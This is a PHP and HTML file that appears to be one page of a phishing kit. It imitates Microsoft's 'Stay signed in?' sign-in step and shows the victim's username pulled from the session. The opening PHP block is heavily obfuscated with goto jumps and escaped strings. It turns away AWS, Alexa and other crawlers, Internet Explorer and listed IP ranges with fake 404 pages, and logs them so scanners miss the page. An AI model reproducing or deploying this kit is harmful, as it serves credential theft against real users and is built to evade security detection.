<?php
goto AFm2V; gRQoB: if ($BLOCKAWS == "\61") { if (strpos($_SERVER["\x48\x54\x54\x50\137\125\123\105\122\137\x41\107\105\x4e\x54"], "\141\x77\x73") !== false || strpos($_SERVER["\110\x54\x54\x50\137\125\x53\105\122\x5f\101\107\x45\116\124"], "\x61\154\x65\x78\x61") !== false || strpos($_SERVER["\110\124\124\120\x5f\125\123\105\x52\137\101\107\105\116\124"], "\141\155\172\156\153\x61\x73\x73\x6f\x63\142\x6f\164") !== false || strpos($_SERVER["\x48\x54\x54\120\x5f\x55\123\105\x52\137\101\x47\105\116\124"], "\145\155\141\x63\163\55\167\63\x20\x73\x65\141\x72\x63\150\40\145\x6e\147\x69\x6e\145") !== false) { goto uQp_9; eniS7: die("\74\x68\61\x3e\x34\x30\x34\x20\116\157\x74\x20\x46\x6f\165\x6e\144\x3c\x2f\x68\61\x3e\124\x68\145\x20\160\141\147\145\x20\164\150\x61\x74\40\x79\157\x75\40\150\x61\x76\145\x20\162\x65\x71\x75\x65\163\164\x65\x64\40\x63\157\x75\154\144\x20\x6e\x6f\x74\40\142\x65\x20\x66\x6f\x75\156\x64\x2e"); goto n9Lwt; GEpaC: fclose($file); goto qpNqM; uQp_9: $file = fopen("\x62\157\164\x73\x2e\164\x78\164", "\x61"); goto izPAA; izPAA: fwrite($file, $_SERVER["\x52\105\x4d\x4f\x54\105\137\101\x44\x44\x52"] . "\x20" . $_SERVER["\x48\124\x54\120\137\125\x53\105\122\137\x41\x47\105\116\x54"] . "\15\xa"); goto GEpaC; n9Lwt: exit; goto feiWE; qpNqM: header("\x48\124\x54\x50\x2f\61\56\x30\x20\64\60\x34\40\116\x6f\x74\40\x46\x6f\x75\156\144"); goto eniS7; feiWE: } } goto nALrl; gqzxO: if ($BLOCKIPRANGE == "\61") { include "\151\160\x72\141\156\147\x65\56\160\x68\160"; if (in_array($_SERVER["\x52\105\x4d\117\124\105\x5f\101\104\104\122"], $bannedIP)) { goto zb6K2; zb6K2: header("\110\x54\124\x50\x2f\61\56\x30\40\64\60\64\x20\x4e\x6f\164\40\106\157\165\156\144"); goto faSKx; faSKx: die("\x3c\150\61\x3e\64\x30\64\x20\x4e\x6f\164\40\x46\157\x75\156\x64\74\57\x68\61\x3e\124\x68\x65\40\160\x61\147\145\40\164\150\141\164\x20\x79\157\165\40\150\x61\166\145\40\162\x65\x71\165\145\163\164\145\144\x20\x63\x6f\165\154\x64\40\x6e\157\164\x20\x62\145\40\x66\x6f\x75\x6e\144\56"); goto ZSpBW; ZSpBW: exit; goto AN28C; AN28C: } else { foreach ($bannedIP as $ip) { if (preg_match("\x2f" . $ip . "\x2f", $_SERVER["\x52\x45\115\117\x54\105\137\x41\104\x44\122"])) { goto U_f3B; BUOeR: header("\110\x54\124\120\x2f\61\56\60\x20\64\x30\x34\x20\116\x6f\x74\40\x46\157\x75\x6e\144"); goto LZfCT; LZfCT: die("\x3c\x68\x31\76\64\60\64\x20\x4e\157\x74\x20\x46\x6f\165\156\144\74\x2f\x68\61\76\124\150\x65\x20\x70\x61\x67\145\x20\x74\x68\141\x74\x20\171\157\x75\40\x68\141\x76\x65\40\162\x65\161\x75\x65\x73\x74\x65\x64\40\x63\157\165\x6c\144\x20\x6e\x6f\x74\40\x62\145\40\x66\x6f\165\x6e\144\x2e"); goto P2Qev; HHg2z: fclose($file); goto BUOeR; U_f3B: $file = fopen("\x62\157\164\x73\x2e\164\x78\164", "\141"); goto SIwlH; SIwlH: fwrite($file, $_SERVER["\x52\105\115\117\x54\105\x5f\x41\x44\104\x52"] . "\40" . $_SERVER["\x48\x54\124\120\137\125\123\x45\x52\137\101\107\x45\116\x54"] . "\15\12"); goto HHg2z; P2Qev: exit; goto ugFDE; ugFDE: } mg0lM: } lhJZo: } } goto Z8V9f; nALrl: if ($BLOCKIE == "\x31") { if (strpos($_SERVER["\x48\x54\124\120\x5f\x55\123\x45\122\x5f\101\x47\x45\x4e\124"], "\124\x72\151\144\145\156\x74") !== false) { goto JpofZ; RFT9v: exit; goto SdwSU; GZ3UI: fwrite($file, $_SERVER["\122\105\115\117\x54\x45\x5f\101\104\x44\x52"] . "\x20" . $_SERVER["\110\x54\124\120\137\x55\123\x45\122\137\101\x47\105\x4e\x54"] . "\15\12"); goto GSfZH; JpofZ: $file = fopen("\x62\x6f\x74\163\56\164\170\164", "\141"); goto GZ3UI; td20Z: header("\110\124\x54\120\x2f\61\56\60\x20\x34\60\x34\40\x4e\157\164\40\106\x6f\165\x6e\144"); goto coiws; coiws: die("\x3c\150\x31\x3e\64\60\x34\x20\x4e\157\x74\40\106\157\165\x6e\x64\x3c\x2f\150\x31\76\124\150\x65\40\160\141\x67\x65\40\x74\x68\x61\x74\x20\x79\x6f\x75\40\x68\141\166\145\40\x72\x65\x71\165\x65\x73\x74\x65\x64\40\143\157\x75\x6c\x64\x20\156\x6f\164\40\x62\x65\x20\146\157\165\156\x64\56"); goto RFT9v; GSfZH: fclose($file); goto td20Z; SdwSU: } } goto gqzxO; nCNcr: include "\143\x6f\x6e\146\151\147\56\160\x68\160"; goto gRQoB; WoCKC: include "\x63\x6f\156\146\x69\x67\x2e\160\x68\160"; goto lEw0M; AFm2V: error_reporting(0); goto cHpFy; ndbVh: $v_ip = $_SERVER["\122\105\x4d\117\x54\105\x5f\101\x44\104\122"]; goto c4rst; Z8V9f: if ($BLOCKOTHERBOTS == "\61") { if (!empty($_SERVER["\x48\124\124\120\137\125\123\x45\x52\137\x41\107\x45\116\124"])) { goto mdQQr; obJrw: ZVZaJ: goto XoBrx; mdQQr: include "\x6f\164\x68\x65\162\142\x2e\x70\150\160"; goto QMNUP; QMNUP: foreach ($userAgents as $agent) { if (strpos($_SERVER["\110\x54\x54\x50\137\x55\123\105\x52\137\101\107\105\116\x54"], $agent) !== false) { goto CH7S1; l_YRV: fclose($file); goto CKzxj; ERkEE: die("\74\x68\x31\76\x34\60\64\x20\116\x6f\164\40\106\157\165\x6e\144\74\57\150\61\x3e\124\x68\x65\x20\x70\141\x67\145\x20\164\150\x61\164\40\171\x6f\165\40\150\x61\166\145\x20\x72\x65\x71\165\145\163\164\x65\144\40\143\157\165\x6c\144\x20\x6e\x6f\x74\x20\142\145\x20\146\157\x75\x6e\144\56"); goto qnJlI; CKzxj: header("\110\124\124\120\x2f\x31\x2e\x30\x20\64\60\x34\x20\x4e\x6f\164\40\106\157\x75\156\x64"); goto ERkEE; bbqb3: fwrite($file, $_SERVER["\122\105\x4d\117\x54\x45\137\x41\x44\104\122"] . "\40" . $_SERVER["\110\124\x54\120\x5f\x55\x53\105\122\x5f\x41\107\x45\116\124"] . "\15\xa"); goto l_YRV; CH7S1: $file = fopen("\142\157\164\163\x2e\x74\170\x74", "\141"); goto bbqb3; qnJlI: exit; goto hFz87; hFz87: } VdF1P: } goto obJrw; XoBrx: } } goto ndbVh; cHpFy: session_start(); goto nCNcr; c4rst: $hash = md5($v_ip); goto WoCKC; lEw0M: if ($truelogin == false) { sleep(2); }

?>

<!DOCTYPE html>

<html dir="ltr" lang="EN-US">

<head>


<script>
function empty() {
    var x;
    x = document.getElementById("password").value;
    if (x == "") {
        document.getElementById("password").style = "border-color:red";
		document.getElementById("password_error").style = "display: block";
        return false;
    };

}
</script>
<script>
	function myFunction()
{
    document.getElementById('loader').style='display:block;margin-bottom: 31px;margin-top: 1‒;max-width: 100%;margin-top: -34px;';
}
</script>
<script>
function change() {
    var e;
    e = document.getElementById("password").value;
    if (e !== ""){
	    document.getElementById("password").style = "";
		document.getElementById("password_error").style = "display: none";
	}
	
}

</script>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge">

<base href=".">
<title>Sign in</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
<link rel="shortcut icon" href="./files2/favicon.ico">
            <link rel="stylesheet" title="Converged" type="text/css" href="./files/Converged1033.css">
			<style type="text/css">body.cb input.hip
    {
        border-width: 2px !important;
    }
</style><style type="text/css">body{display:none;}</style>
<style type="text/css">body{display:block !important;}</style>
<style> .wrapper {
    position: relative;
    overflow: hidden;
}

#slide {
    right: -128px;
    -webkit-animation: slide 0.3s forwards;
	
    -webkit-animation-delay: 0s;
    animation: slide 0.4s forwards; 1s fadeIn;
    animation-delay: 0s;
	    opacity: 0;
padding: 0px 0px 0px 2px;
}

@-webkit-keyframes slide {
    100% {
        right: 0;

    }
}

@keyframes slide {
    100% {
        right: 0;
		opacity: 1;
    }
}

</style>
</head>

      <body 
   <?php if ($REDGHOST==1)
   {echo 'onload="myFunction()"';}?> class="cb" data-bind="defineGlobals: ServerData, bodyCssClass" >
 

 <script>
function myFunction() {
window.history.pushState('Object', 'Title', 'common/login');
}
</script> 
<div> <div><div class="background" role="presentation"><div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;./files2/1-small.jpg&quot;);"></div> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;<?php echo $_SESSION['bg']; ?>&quot;);z-index:<?php echo $_SESSION['zindex'];?>;"></div><div class="background-overlay"></div></div></div> 



 <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.A2,
            showFooterLinks: true,
            useWizardBehavior: svr.BR,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"> <div class="middle">
<div class="background-logo-holder"> <img id="banner_image" class="background-logo" src="<?php echo $_SESSION['llogo'];?>"> </div>
						<div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }" style="
    min-height: 350px;
    min-width: 338px;
    max-width: 440px;
">
<img class="background-logo" id="loader" style="display:none;margin-bottom: 31px;max-width: 100%;margin-top: -34px;width: 241px;" role="presentation" data-bind="attr: { src: backgroundLogoUrl }" src="files/load2.gif">
			<div data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
						
						<img class="logo" role="presentation" pngsrc="<?php echo $_SESSION['logo']; ?>" svgsrc="<?php echo $_SESSION['logo']; ?>" data-bind="imgSrc" src="<?php echo $_SESSION['logo']; ?>"></div> <div data-bind="
                    css: { &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) },
                    component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }">
							</br>
							<?php echo $_SESSION['username']; ?><div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }" class="animate"><div data-viewid="2" data-dynamicbranding="true" data-bind="pageViewComponent: { name: &#39;login-paginated-password-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            hasRemoteNgc: !!sharedData.remoteNgcParams.sessionIdentifier,
                            desktopSsoEnabled: sharedData.desktopSsoEnabled,
                            defaultKmsiValue: svr.I === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            isLongRunningTransaction: sharedData.isLongRunningTransaction },
                        event: {
                            submitReady: $loginPage.view_onSubmitReady,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            desktopSsoStart: $loginPage.view_desktopSsoStart } }">

							<input type="text" name="loginfmt" data-bind="moveOffScreen, value: displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">

							<div data-bind="component: { name: &#39;identity-banner-control&#39;,
     params: {
        pawnIconId: svr.Bw,
        displayName: displayName } }"> </div></div> 
<div id="slide" class="wrapper">		
		
		<div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']" style="
    font-weight: 600;
">Stay signed in?</div>
<div class="row text-body"> <div id="KmsiDescription" class="text-block-body overflow-hidden no-margin-top" data-bind="text: str['STR_Kmsi_Description']">Do this to reduce the number of times you are asked to sign in.</div> </div> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"> </div> <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div class="row"> <div class="col-md-24 form-group checkbox"> <label> <input id="KmsiCheckboxField" name="DontShowAgain" type="checkbox" value="true" data-bind="ariaLabel: str['STR_Kmsi_DontShowAgain']" aria-label="Don't show this again"> <span data-bind="text: str['STR_Kmsi_DontShowAgain']">Don't show this again</span> </label> </div> </div> <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['STR_Kmsi_Accept_Kmsi'],
            secondaryButtonText: str['STR_Kmsi_Decline_Kmsi'],
            focusOnPrimaryButton: true,
            primaryButtonDescribedBy: 'KmsiDescription' },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }">
    
    <div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }" style="
    bottom: 0;
    right: 0;
    text-align: right;
"><!-- ko if: isSecondaryButtonVisible --> <div class="inline-block" style="
    display: inline-block;
"> <input type="button" id="idBtn_Back" class="btn btn-block" data-bind="
            attr: { 'id': secondaryButtonId || 'idBtn_Back' },
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            ariaDescribedBy: secondaryButtonDescribedBy,
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled"  onclick="window.location.href='<?php echo $over;?>'" value="No"> </div><!-- /ko --> <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block" style="
    display: inline-block;
"><!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --> <input type="button" onclick="window.location.href='<?php echo $over;?>'" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: primaryButtonAttributes,
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" aria-describedby="KmsiDescription" value="Yes"> </div> </div>
            
            
</div> </div> </div> </div> </div>  </div>  <div class="row"> <div class="col-md-24">  </div> </div> </div> </div></div> </div>  <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"></div> </div> </div> <div id="footer" class="footer default" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }"> <div data-bind="component: { name: &#39;footer-control&#39;,
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"> <div id="footerLinks" class="footerNode text-secondary"> <span id="ftrCopy" data-bind="html: svr.aa">©2020 Microsoft</span> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="">Terms of Use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; Cookies</a> </div> </div> </div>  </div></body></html>